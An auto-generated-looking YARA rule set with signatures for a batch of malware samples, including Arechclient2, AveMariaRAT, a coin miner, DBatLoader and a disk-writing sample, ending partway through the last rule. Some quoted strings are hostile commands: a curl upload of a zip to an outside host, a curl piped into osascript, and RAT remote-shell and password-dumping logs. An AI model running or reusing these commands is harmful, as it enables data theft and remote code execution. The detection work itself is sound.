/*
   YARA Rule Set
   Author: Metin Yigit
   Date: 2025-09-28
   Identifier: _subset_batch
   Reference: internal
*/

/* Rule Set ----------------------------------------------------------------- */

import "pe"

rule c2fd821a5c7aaf5cc463fd891d2376541a1daa0826753b4e370ec41368db219d_c2fd821a {
   meta:
      description = "_subset_batch - file c2fd821a5c7aaf5cc463fd891d2376541a1daa0826753b4e370ec41368db219d_c2fd821a.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "c2fd821a5c7aaf5cc463fd891d2376541a1daa0826753b4e370ec41368db219d"
   strings:
      $x1 = "api-ms-win-downlevel-shell32-l1-1-0.dll" fullword wide /* reversed goodware string 'lld.0-1-1l-23llehs-levelnwod-niw-sm-ipa' */ /* score: '35.00'*/
      $x2 = "NetLog events and metadata, including sensitive information such as hostnames, URLs, HTTP headers and other identifiable informa" ascii /* score: '33.00'*/
      $s3 = "NetLog events and metadata, including sensitive information such as hostnames, URLs, HTTP headers and other identifiable informa" ascii /* score: '25.00'*/
      $s4 = "PERFETTO_CHECK(ptr <= chunk.end() - SharedMemoryABI::kPacketHeaderSize)" fullword ascii /* score: '23.00'*/
      $s5 = "msedge.dll" fullword wide /* score: '23.00'*/
      $s6 = "Wwindows.storage.onecore.dll" fullword wide /* score: '23.00'*/
      $s7 = "msedge.exe" fullword wide /* score: '22.00'*/
      $s8 = ").  Dumping unresolved backtrace:" fullword ascii /* score: '21.00'*/
      $s9 = "Stale pooled_task_runner_delegate_ - task not posted. This is" fullword ascii /* score: '20.00'*/
      $s10 = "NetLog events and metadata. Describes the operation of the //net network stack, e.g. HTTP requests, TLS, DNS, connections, socke" ascii /* score: '20.00'*/
      $s11 = "mutex lock failed" fullword ascii /* score: '20.00'*/
      $s12 = "NetLog events and metadata. Describes the operation of the //net network stack, e.g. HTTP requests, TLS, DNS, connections, socke" ascii /* score: '20.00'*/
      $s13 = "msedge_elf.dll" fullword ascii /* score: '20.00'*/
      $s14 = "api-ms-win-core-wow64-l1-1-1.dll" fullword wide /* score: '20.00'*/
      $s15 = "identity_helper.exe" fullword wide /* score: '19.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      1 of ($x*) and 4 of them
}

rule bd852b4a08c9a7aee473f2dd82ff1ce652a6590cabdc764a89c6f4496ed1896d_bd852b4a {
   meta:
      description = "_subset_batch - file bd852b4a08c9a7aee473f2dd82ff1ce652a6590cabdc764a89c6f4496ed1896d_bd852b4a.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "bd852b4a08c9a7aee473f2dd82ff1ce652a6590cabdc764a89c6f4496ed1896d"
   strings:
      $s1 = "rlUser-Agent: Mozilla/5.0" fullword ascii /* score: '17.00'*/
      $s2 = "TryFromIntErrorsrc/floods/packet_build.rsInteriorNul" fullword ascii /* score: '12.00'*/
      $s3 = "__vdso_clock_gettime" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule d998de6e40637188ccbb8ab4a27a1e76f392cb23df5a6a242ab9df8ee4ab3936_d998de6e {
   meta:
      description = "_subset_batch - file d998de6e40637188ccbb8ab4a27a1e76f392cb23df5a6a242ab9df8ee4ab3936_d998de6e.macho"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "d998de6e40637188ccbb8ab4a27a1e76f392cb23df5a6a242ab9df8ee4ab3936"
   strings:
      $s1 = "/Users/martinez/dev/getkey/getkey/" fullword ascii /* score: '20.00'*/
      $s2 = "/Users/martinez/dev/getkey/DerivedData/getkey/Build/Intermediates.noindex/getkey.build/Release/getkey.build/Objects-normal/x86_6" ascii /* score: '20.00'*/
      $s3 = "/Users/martinez/dev/getkey/DerivedData/getkey/Build/Intermediates.noindex/getkey.build/Release/getkey.build/Objects-normal/x86_6" ascii /* score: '20.00'*/
      $s4 = "<key>com.apple.security.get-task-allow</key>" fullword ascii /* score: '18.00'*/
      $s5 = "<key>com.apple.security.temporary-exception.files.absolute-path.read-only</key>" fullword ascii /* score: '17.00'*/
      $s6 = "***** INVALID CLIP CONTENTS! *****" fullword ascii /* score: '17.00'*/
      $s7 = "<key>com.apple.security.temporary-exception.mach-lookup.global-name</key>" fullword ascii /* score: '14.00'*/
      $s8 = "@_IOHIDElementGetUsage" fullword ascii /* score: '14.00'*/
      $s9 = "getkey-5555494427632fc7d5433f05a064202a607edcbd" fullword ascii /* score: '14.00'*/
      $s10 = "_get_clip_content" fullword ascii /* score: '14.00'*/
      $s11 = "_IOHIDElementGetUsage" fullword ascii /* score: '14.00'*/
      $s12 = "/System/Library/Frameworks/CoreFoundation.framework/Versions/A/CoreFoundation" fullword ascii /* score: '13.00'*/
      $s13 = "/System/Library/Frameworks/IOKit.framework/Versions/A/IOKit" fullword ascii /* score: '13.00'*/
      $s14 = "_CFRunLoopGetMain" fullword ascii /* score: '12.00'*/
      $s15 = "_GetCurrentKeyModifiers" fullword ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0xfacf and filesize < 100KB and
      8 of them
}

rule b1ba444108060086b1f71015060f669543bb4f10b632dc5120ee53640ed6348e_b1ba4441 {
   meta:
      description = "_subset_batch - file b1ba444108060086b1f71015060f669543bb4f10b632dc5120ee53640ed6348e_b1ba4441.macho"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "b1ba444108060086b1f71015060f669543bb4f10b632dc5120ee53640ed6348e"
   strings:
      $x1 = "osascript -e 'display dialog \"Your Mac does not support this application. Try reinstalling or downloading the version for your " ascii /* score: '31.00'*/
      $x2 = "osascript -e 'display dialog \"Your Mac does not support this application. Try reinstalling or downloading the version for your " ascii /* score: '31.00'*/
      $s3 = "curl -X POST --max-time 300 -F \"file=@/tmp/telemetry.zip\" \"https://macosdev.world/upload/telemetry?tag=mvr\"" fullword ascii /* score: '24.00'*/
      $s4 = "_mh_execute_header" fullword ascii /* score: '19.00'*/
      $s5 = "curl \"https://macosdev.world/download/applescript?tag=mvr\" | osascript" fullword ascii /* score: '19.00'*/
      $s6 = "loader-arm64.out" fullword ascii /* score: '16.00'*/
   condition:
      uint16(0) == 0xfeca and filesize < 100KB and
      1 of ($x*) and all of them
}

rule Arechclient2_signature__32f3282581436269b3a75b6675fe3e08_imphash_ {
   meta:
      description = "_subset_batch - file Arechclient2(signature)_32f3282581436269b3a75b6675fe3e08(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "470ee0d5bd2f72219b279026622cec0ebe3f5c1093bf9d2b2377dda85695968f"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $x2 = "<assemblyIdentity version=\"1.0.0.0\" processorArchitecture=\"X86\" name=\"Nullsoft.NSIS.exehead\" type=\"win32\"/><description>" ascii /* score: '31.00'*/
      $s3 = "<requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/></requestedPrivileges></security></trustInfo><compatibility xml" ascii /* score: '26.00'*/
      $s4 = " Install System v7.76.3-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
      $s5 = "<*<5<D<`<" fullword ascii /* score: '9.00'*/ /* hex encoded string ']' */
      $s6 = ">,>3>>>F>{>" fullword ascii /* score: '9.00'*/ /* hex encoded string '?' */
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      1 of ($x*) and all of them
}

rule Arechclient2_signature__32f3282581436269b3a75b6675fe3e08_imphash__433040f5 {
   meta:
      description = "_subset_batch - file Arechclient2(signature)_32f3282581436269b3a75b6675fe3e08(imphash)_433040f5.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "433040f5d73d4eec63151e61a65b6aed23578a8dc66360c3d6021b3186fd799b"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $x2 = "<assemblyIdentity version=\"1.0.0.0\" processorArchitecture=\"X86\" name=\"Nullsoft.NSIS.exehead\" type=\"win32\"/><description>" ascii /* score: '31.00'*/
      $s3 = "<requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/></requestedPrivileges></security></trustInfo><compatibility xml" ascii /* score: '26.00'*/
      $s4 = " Install System v1.63.5-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
      $s5 = "<*<5<D<`<" fullword ascii /* score: '9.00'*/ /* hex encoded string ']' */
      $s6 = ">,>3>>>F>{>" fullword ascii /* score: '9.00'*/ /* hex encoded string '?' */
      $s7 = "RXMX%v%M!" fullword ascii /* score: '8.00'*/
      $s8 = "nlllolol" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      1 of ($x*) and all of them
}

rule CoinMiner_signature__32f3282581436269b3a75b6675fe3e08_imphash_ {
   meta:
      description = "_subset_batch - file CoinMiner(signature)_32f3282581436269b3a75b6675fe3e08(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "e01108a2c1db9807c3a7ca8fc19d3a900857c401995d8a00255556a8c895bf37"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $x2 = "<assemblyIdentity version=\"1.0.0.0\" processorArchitecture=\"X86\" name=\"Nullsoft.NSIS.exehead\" type=\"win32\"/><description>" ascii /* score: '31.00'*/
      $s3 = "<requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/></requestedPrivileges></security></trustInfo><compatibility xml" ascii /* score: '26.00'*/
      $s4 = " Install System v7.41.8-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
      $s5 = "<*<5<D<`<" fullword ascii /* score: '9.00'*/ /* hex encoded string ']' */
      $s6 = ">,>3>>>F>{>" fullword ascii /* score: '9.00'*/ /* hex encoded string '?' */
   condition:
      uint16(0) == 0x5a4d and filesize < 6000KB and
      1 of ($x*) and all of them
}

rule Arechclient2_signature__b729b61eb1515fcf7b3e511e4e66258b_imphash_ {
   meta:
      description = "_subset_batch - file Arechclient2(signature)_b729b61eb1515fcf7b3e511e4e66258b(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "f9e5167d5adced0124cd4149ce339ee0ee2036dfb3bd89484c9feffbf7884650"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $x2 = "<assemblyIdentity version=\"1.0.0.0\" processorArchitecture=\"X86\" name=\"Nullsoft.NSIS.exehead\" type=\"win32\"/><description>" ascii /* score: '31.00'*/
      $s3 = "<requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/></requestedPrivileges></security></trustInfo><compatibility xml" ascii /* score: '26.00'*/
      $s4 = " Install System v2.57.7-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
      $s5 = "sqVO:\"" fullword ascii /* score: '10.00'*/
      $s6 = ":.COMB" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      1 of ($x*) and all of them
}

rule c32ba42c73a2bc24d2788f7750d87edb_imphash_ {
   meta:
      description = "_subset_batch - file c32ba42c73a2bc24d2788f7750d87edb(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "89d1f7e885ee48eb7aa788cbad128871776d26457ff70fbb634d34f1cf44a64f"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $x2 = "<assemblyIdentity version=\"1.0.0.0\" processorArchitecture=\"X86\" name=\"Nullsoft.NSIS.exehead\" type=\"win32\"/><description>" ascii /* score: '31.00'*/
      $s3 = "<requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/></requestedPrivileges></security></trustInfo><compatibility xml" ascii /* score: '26.00'*/
      $s4 = " Install System v7.51.8-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
      $s5 = "./\\~*]69" fullword ascii /* score: '9.00'*/ /* hex encoded string 'i' */
      $s6 = "* rk?lO" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      1 of ($x*) and all of them
}

rule ced282d9b261d1462772017fe2f6972b_imphash_ {
   meta:
      description = "_subset_batch - file ced282d9b261d1462772017fe2f6972b(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "cf347cab91ce92ecb2550184e8f369bd9f13490e73b1676f0b97247b58cd449a"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $x2 = "<assemblyIdentity version=\"1.0.0.0\" processorArchitecture=\"*\" name=\"Nullsoft.NSIS.exehead\" type=\"win32\"/><description>Nu" ascii /* score: '31.00'*/
      $s3 = "Controls\" version=\"6.0.0.0\" processorArchitecture=\"*\" publicKeyToken=\"6595b64144ccf1df\" language=\"*\" /></dependentAssem" ascii /* score: '25.00'*/
      $s4 = "endency><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivileges><requestedExecutionLevel level=\"as" ascii /* score: '22.00'*/
      $s5 = "nstall System v3.06.1</description><dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Comm" ascii /* score: '13.00'*/
      $s6 = "oker\" uiAccess=\"false\"/></requestedPrivileges></security></trustInfo><compatibility xmlns=\"urn:schemas-microsoft-com:compati" ascii /* score: '10.00'*/
      $s7 = "CRYPTBASE" fullword ascii /* score: '8.50'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      1 of ($x*) and all of them
}

rule b81032b06de2fb6c7086cc8acf8c5033_imphash_ {
   meta:
      description = "_subset_batch - file b81032b06de2fb6c7086cc8acf8c5033(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "3b136e3c8fc3c20400903af15e3b8b2b854b1f3e5f4a828e3334a0790ddfd3bf"
   strings:
      $s1 = "  -e,  --execute=COMMAND   execute a `.wgetrc'-style command." fullword ascii /* score: '21.00'*/
      $s2 = "EMILEMITEMMAENDSERICEROSEVENEVEREVILEYEDFACEFACTFADEFAILFAINFAIRFAKEFALLFAMEFANGFARMFASTFATEFAWNFEARFEATFEEDFEELFEETFELLFELTFEND" ascii /* score: '19.50'*/
      $s3 = "  -U,  --user-agent=AGENT      identify as AGENT instead of Wget/VERSION." fullword ascii /* score: '19.00'*/
      $s4 = "       --password=PASS           set both ftp and http password to PASS." fullword ascii /* score: '19.00'*/
      $s5 = "i686-pc-mingw32-gcc -DHAVE_CONFIG_H -DSYSTEM_WGETRC=\"/win32dev/misc/wget/1.13-static/etc/wgetrc\" -DLOCALEDIR=\"/win32dev/misc/" ascii /* score: '18.00'*/
      $s6 = "RUBERUBYRUDERUDYRUINRULERUNGRUNSRUNTRUSERUSHRUSKRUSSRUSTRUTHSACKSAFESAGESAIDSAILSALESALKSALTSAMESANDSANESANGSANKSARASAULSAVESAYS" ascii /* score: '16.50'*/
      $s7 = "       --ftp-password=PASS     set ftp password to PASS." fullword ascii /* score: '16.00'*/
      $s8 = "Wget [%d%%] %s" fullword ascii /* score: '16.00'*/
      $s9 = "       --content-disposition   honor the Content-Disposition header when" fullword ascii /* score: '15.00'*/
      $s10 = "HANGHANKHANSHARDHARKHARMHARTHASHHASTHATEHATHHAULHAVEHAWKHAYSHEADHEALHEARHEATHEBEHECKHEEDHEELHEFTHELDHELLHELMHERBHERDHEREHEROHERS" ascii /* score: '14.50'*/
      $s11 = "       --proxy-password=PASS   set PASS as proxy password." fullword ascii /* score: '14.00'*/
      $s12 = "       --http-password=PASS    set http password to PASS." fullword ascii /* score: '14.00'*/
      $s13 = "       --user=USER               set both ftp and http user to USER." fullword ascii /* score: '14.00'*/
      $s14 = "  -c,  --continue                resume getting a partially-downloaded file." fullword ascii /* score: '14.00'*/
      $s15 = "gnu_wget_fake_fork_%lu" fullword ascii /* score: '14.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      8 of them
}

rule Babadeda_signature__5877688b4859ffd051f6be3b8e0cd533_imphash_ {
   meta:
      description = "_subset_batch - file Babadeda(signature)_5877688b4859ffd051f6be3b8e0cd533(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "1961897112dcec4c7074ced36e6fb62994cf987c1b24455c726989f4ee03d2ab"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?> <assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersi" ascii /* score: '58.00'*/
      $s2 = " or \"requireAdministrator\" --> <v3:requestedExecutionLevel level=\"requireAdministrator\" /> </v3:requestedPrivileges> </v3:se" ascii /* score: '28.00'*/
      $s3 = "2147483648" wide /* score: '17.00'*/ /* hex encoded string '!GH6H' */
      $s4 = "> <dependency> <dependentAssembly> <assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0" ascii /* score: '15.00'*/
      $s5 = "v3=\"urn:schemas-microsoft-com:asm.v3\"> <v3:security> <v3:requestedPrivileges> <!-- level can be \"asInvoker\", \"highestAvaila" ascii /* score: '14.00'*/
      $s6 = "Downloads\\" fullword wide /* score: '10.00'*/
      $s7 = "cessorArchitecture=\"*\" publicKeyToken=\"6595b64144ccf1df\" language=\"*\" /> </dependentAssembly> </dependency> <v3:trustInfo " ascii /* score: '9.00'*/
      $s8 = "Denormal floating-point operand" fullword wide /* score: '9.00'*/
      $s9 = "Invalid floating-point operation" fullword wide /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 300KB and
      1 of ($x*) and all of them
}

rule AveMariaRAT_signature_ {
   meta:
      description = "_subset_batch - file AveMariaRAT(signature).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "12a6b979da40489d768e28882836de2434009bcb436c2901772bed7633d88770"
   strings:
      $x1 = "C:\\Users\\louis\\Documents\\workspace\\MortyCrypter\\MsgBox.exe" fullword wide /* score: '35.00'*/
      $s2 = "Server::onReceive() Received new <DownloadAndExecuteCommand>" fullword wide /* score: '30.00'*/
      $s3 = "PasswordHandler::dumpVaultPassword() _VaultGetItemWin8 : %d" fullword wide /* score: '27.00'*/
      $s4 = "CommandHandler::handleRemoteShell() Session closed" fullword wide /* score: '26.00'*/
      $s5 = "CommandHandler::handleRemoteShell() Session errorwrite command" fullword wide /* score: '26.00'*/
      $s6 = "Server::onReceive() Received new <StartKeyloggerCommand>" fullword wide /* score: '25.00'*/
      $s7 = "Server::onReceive() Received new <StopKeyloggerCommand>" fullword wide /* score: '25.00'*/
      $s8 = "CommandHandler::handleRemoteShell() Session opened" fullword wide /* score: '23.00'*/
      $s9 = "CommandHandler::handleRemoteShell() Session Write" fullword wide /* score: '23.00'*/
      $s10 = "Server::onReceive() Received new <KillProcessCommand>" fullword wide /* score: '23.00'*/
      $s11 = "PasswordHandler::loadFirefoxPasswords() PK11_GetInternalKeySlot failed" fullword wide /* score: '23.00'*/
      $s12 = "Environnement::addPrivilegeToProcess() OpenProcessToken : %d" fullword wide /* score: '23.00'*/
      $s13 = "Environnement::addPrivilegeToProcess() LookupPrivilegeValueW : %d" fullword wide /* score: '23.00'*/
      $s14 = "Environnement::addPrivilegeToProcess() AdjustTokenPrivileges : %d" fullword wide /* score: '23.00'*/
      $s15 = "Process::getProcessName() Process \"%d\"not found" fullword wide /* score: '23.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 400KB and
      1 of ($x*) and 4 of them
}

rule Blackmoon_signature__fa3f82769a707df7ded33835087e0044_imphash_ {
   meta:
      description = "_subset_batch - file Blackmoon(signature)_fa3f82769a707df7ded33835087e0044(imphash).dll"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "17664f2a2b6f4e40d4ef63349f78f99487714cb097c505ac6f049b95cdc175b4"
   strings:
      $s1 = "atl.dll" fullword ascii /* reversed goodware string 'lld.lta' */ /* score: '30.00'*/
      $s2 = "AKernel32.dll" fullword ascii /* score: '23.00'*/
      $s3 = "MyIme.dll" fullword ascii /* score: '23.00'*/
      $s4 = "qq.exe" fullword ascii /* score: '16.00'*/
      $s5 = "QQ_Exit_Info_Mutex_" fullword ascii /* score: '15.00'*/
      $s6 = "5pkmir2.dat" fullword ascii /* score: '14.00'*/
      $s7 = "ZYYZYY" fullword ascii /* reversed goodware string 'YYZYYZ' */ /* score: '13.50'*/
      $s8 = "RQWPVS" fullword ascii /* reversed goodware string 'SVPWQR' */ /* score: '13.50'*/
      $s9 = "\\QQ.exe" fullword ascii /* score: '13.00'*/
      $s10 = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)" fullword ascii /* score: '12.00'*/
      $s11 = "5pkmir2-GD.dat" fullword ascii /* score: '11.00'*/
      $s12 = "C15525691BAE8850560D954A079F1D50E747239BD157F13B3BCBADA13D9B00F8C61D3137C72757ACE82F1BFA5299CB0A7095C8845C37C5D49A57623F8633B4D4" ascii /* score: '11.00'*/
      $s13 = "5pkmir2-GD85.dat" fullword ascii /* score: '11.00'*/
      $s14 = "_^]\\[ZYX" fullword ascii /* reversed goodware string 'XYZ[\\]^_' */ /* score: '11.00'*/
      $s15 = "982AEEE833B962DD934296C06E3AB9E52C856AB3DB20150F5BC6701995876D7382740583D2184AACC709C9B88EBBF5CD914660EE7849CB3F22D7BFCC1415FCFB" ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 15000KB and
      8 of them
}

rule c8cd4b32bd55785497d7b925a37f06ac_imphash_ {
   meta:
      description = "_subset_batch - file c8cd4b32bd55785497d7b925a37f06ac(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "01a145af757ac611da356033a1b5ec36b588592f1f20432dbe3f3600ffccb8b8"
   strings:
      $s1 = "logoff.exe" fullword ascii /* score: '27.00'*/
      $s2 = "D:\\WorkSpace\\Project\\SHClient\\tmp\\3.6.9.0\\kscode\\UniClient\\Code\\bin\\UniClient.pdb" fullword ascii /* score: '27.00'*/
      $s3 = "      <assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" processorArchitecture=\"x8" ascii /* score: '27.00'*/
      $s4 = "FXWebSealService.dll" fullword ascii /* score: '26.00'*/
      $s5 = "SSK_Service.dll" fullword ascii /* score: '23.00'*/
      $s6 = "UsbDetectDll.dll" fullword ascii /* score: '23.00'*/
      $s7 = "ARRIVE CMD_GET_QR_LOGIN_DATA" fullword ascii /* score: '23.00'*/
      $s8 = "ecc_readcert.dll" fullword ascii /* score: '23.00'*/
      $s9 = "SESeal.dll" fullword ascii /* score: '23.00'*/
      $s10 = "get login info: <%s>" fullword ascii /* score: '23.00'*/
      $s11 = "SafeEngine.dll" fullword ascii /* score: '23.00'*/
      $s12 = "get login value: <%s>" fullword ascii /* score: '23.00'*/
      $s13 = "DuiLib.dll" fullword ascii /* score: '23.00'*/
      $s14 = "closeie.exe" fullword ascii /* score: '22.00'*/
      $s15 = "Load FXWebSealService.dll fail." fullword ascii /* score: '22.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 12000KB and
      8 of them
}

rule DBatLoader_signature__fdecc8ef21723af039e373c9107ab2eb_imphash_ {
   meta:
      description = "_subset_batch - file DBatLoader(signature)_fdecc8ef21723af039e373c9107ab2eb(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "98f8aa235cf07d4e6fe52c1ad88fd6fcf08d08be178dfc620ab993d1eb90703c"
   strings:
      $s1 = "clWebDarkMagenta" fullword ascii /* score: '14.00'*/
      $s2 = "Stream write error\"Unable to find a Table of Contents" fullword wide /* score: '14.00'*/
      $s3 = "LError loading dock zone from the stream. Expecting version %d, but found %d." fullword wide /* score: '12.50'*/
      $s4 = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\FontSubstitutes" fullword ascii /* score: '12.00'*/
      $s5 = "Unable to insert a line Clipboard does not support Icons/Menu '%s' is already being used by another formDocked control must hav" wide /* score: '12.00'*/
      $s6 = "evalcomp" fullword ascii /* score: '11.00'*/
      $s7 = "\\SYSTEM\\CurrentControlSet\\Control\\Keyboard Layouts\\" fullword ascii /* score: '11.00'*/
      $s8 = "DiPostEqBS1" fullword ascii /* score: '10.00'*/
      $s9 = "Write$Error creating variant or safe array!'%s' is not a valid integer value" fullword wide /* score: '10.00'*/
      $s10 = "FINDCOMP" fullword wide /* score: '9.50'*/
      $s11 = "clWebGhostWhite" fullword ascii /* score: '9.00'*/
      $s12 = "clWebMagenta" fullword ascii /* score: '9.00'*/
      $s13 = "clWebDarkKhaki" fullword ascii /* score: '9.00'*/
      $s14 = "OnGetSiteInfo`" fullword ascii /* score: '9.00'*/
      $s15 = "clWebDarkOrange" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      8 of them
}

rule d7e66fefa3e0c8237e2da5aa4296f710_imphash_ {
   meta:
      description = "_subset_batch - file d7e66fefa3e0c8237e2da5aa4296f710(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "edec5c9ee9d9d8d6ff53c23fd2f066c06ea4dedd34b6e50720c82caeb6987e67"
   strings:
      $s1 = "\\\\.\\pipe\\%08X%016llX%02X%08X" fullword ascii /* score: '19.00'*/
      $s2 = "ReflectiveLoader" fullword ascii /* score: '13.00'*/
      $s3 = "encrypted_data:" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 200KB and
      all of them
}

rule DiskWriter_signature__218c766ff54801be6c7a866bdae4bb72_imphash_ {
   meta:
      description = "_subset_batch - file DiskWriter(signature)_218c766ff54801be6c7a866bdae4bb72(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "e4cc2defb76cc6de37d43151b02e5b8b5f546bfd1dd6d703e30e0c046ec9d320"
   strings:
      $x1 = "C:\\Users\\Heinrich\\Downloads\\No-Escape-SOURCE--main\\No-Escape-SOURCE--main\\Release\\No Escape.pdb" fullword ascii /* score: '35.00'*/
      $x2 = "C:\\Windows\\system32\\userinit.exe,C:\\Windows\\System32\\winnt32.exe" fullword ascii /* score: '32.00'*/
      $s3 = "C:\\Windows\\System32\\winnt32.exe" fullword wide /* score: '29.00'*/
      $s4 = "regedit /s C:\\Windows\\System32\\hello.reg" fullword ascii /* score: '29.00'*/
      $s5 = "regedit -s C:\\Windows\\System32\\hello.reg" fullword ascii /* score: '29.00'*/
      $s6 = "C:\\Windows\\System32\\notepad.exe" fullword wide /* score: '29.00'*/
      $s7 = "C:\\Users\\Public\\Desktop\\" fullword wide /* score: '27.00'*/
      $s8 = "C:\\Windows\\System32\\winnt32.exe \"%1\" %*" fullword ascii /* score: '25.00'*/
      $s9 = "C:\\hello.bat" fullword wide /* score: '25.00'*/
      $s10 = "@=\"C:\\\\Windows\\\\System32\\\\winnt32.exe \\\"%1\\\" %*\"" fullword wide /* score: '25.00'*/
      $s11 = "attrib +s +h C:\\hello.bat" fullword ascii /* score: '22.00'*/
      $s12 = "C:\\Windows\\System32\\noescapeexe.txt" fullword ascii /* score: '21.00'*/
      $s13 = "takeown /f \"C:\\ProgramData\\Microsoft\\User Account Pictures\" /r /d y" fullword ascii /* score: '21.00'*/
      $s14 = "C:\\hello.png" fullword wide /* score: '21.00'*/
      $s15 = "C:\\user.png" fullword ascii /* score: '19.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and 4 of them
}

rule b4ab03be57647ae687f95a520b3c9f09_imphash_ {
   meta:
      description = "_subset_batch - file b4ab03be57647ae687f95a520b3c9f09(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "ad0d2c7d8407e72671a1355c70d75bc3f8e5fe66b271a3b1b0ca9f12b1ca5ef5"
   strings:
      $s1 = "muirct.exe" fullword wide /* score: '27.00'*/
      $s2 = "Muirct.exe MUI build tool" fullword wide /* score: '19.00'*/
      $s3 = "        <requestedExecutionLevel  level=\"asInvoker\" />" fullword ascii /* score: '15.00'*/
      $s4 = "Unadvise - enter cookie returned by Advice" fullword wide /* score: '15.00'*/
      $s5 = "lns:asmv2=\"urn:schemas-microsoft-com:asm.v2\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">" fullword ascii /* score: '13.00'*/
      $s6 = "             requestedExecutionLevel node with one of the following ." fullword ascii /* score: '11.00'*/
      $s7 = "muirct" fullword wide /* score: '10.00'*/
      $s8 = " constructor or from DllMain." fullword ascii /* score: '9.00'*/
